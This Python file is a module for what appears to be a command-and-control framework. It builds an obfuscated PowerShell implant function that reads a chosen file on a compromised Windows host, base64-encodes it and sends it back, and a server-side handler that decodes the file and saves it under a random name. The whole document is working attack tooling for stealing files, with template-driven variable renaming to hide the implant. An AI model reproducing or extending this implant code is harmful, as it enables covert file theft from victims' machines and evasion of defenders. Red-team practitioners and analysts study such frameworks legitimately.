import secrets
import base64

from Storage.settings import Settings


class DownloadFile:
    type = "FD"
    args = "base64 target file"
    input = "download_file"
    # this must be unique across ALL implants, any matching keys will be merged causing errors.
    # To safely format this use the following format "<type>_variablename":"value" i.e.
    #   fd_base64_var: base64filecontents
    # Accessing this value will be done by using Jinja markup via the "mod_obf" dictionary in Jinja i.e.:
    # Write-Host "Contents are: {{ mod_obf.fd_base64_var }}"
    obfuscation_keypairs = {
        "fd_base64_var": "base64file"
        }

    def process_implant_response(self, data, args):
        """print("sub class")
        :param data: Byte encoded file
        :param filepath: The downloaded file path i.e. C:\Windows\System32\drivers\etc\hosts
        :return: None

        File download takes byte encoded data and directly writes it to a randomly named file, returning the
          file location.
        IN DEV:
          Parse filepath for the filename
          Check for file extensions
          Check if the file exists using SHA1
          Check writing to local file succeeds
          Check for filename uniqueness.
        """

        filename = secrets.token_hex(3)
        download_file_path = f"{Settings.file_download_folder}downloaded_file_{filename}"
        try:
            with open(download_file_path, 'wb') as file_h:

                file_h.write(base64.b64decode(data))
            return f"File downloaded: {args}\nFile saved to {download_file_path}", None
        except Exception as e:
            return "File download failed.", None

    def implant_text(self):
        var = '''
function {{ ron.obf_download_file }} ($b){
    try {
        ${{ mod_obf.fd_base64_var }} = [Convert]::ToBase64String([IO.File]::ReadAllBytes($b))
        $global:tr = ${{ mod_obf.fd_base64_var }}
    } catch {
        $global:tr = "0"
    }
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True

    def create_module_data_string(self, cmd_entry):
        # This function is responsible for creating the string which is send to the implant
        encoded_target_file = base64.b64encode(cmd_entry['args'].encode()).decode()
        to_return = f"{encoded_target_file}"
        return to_return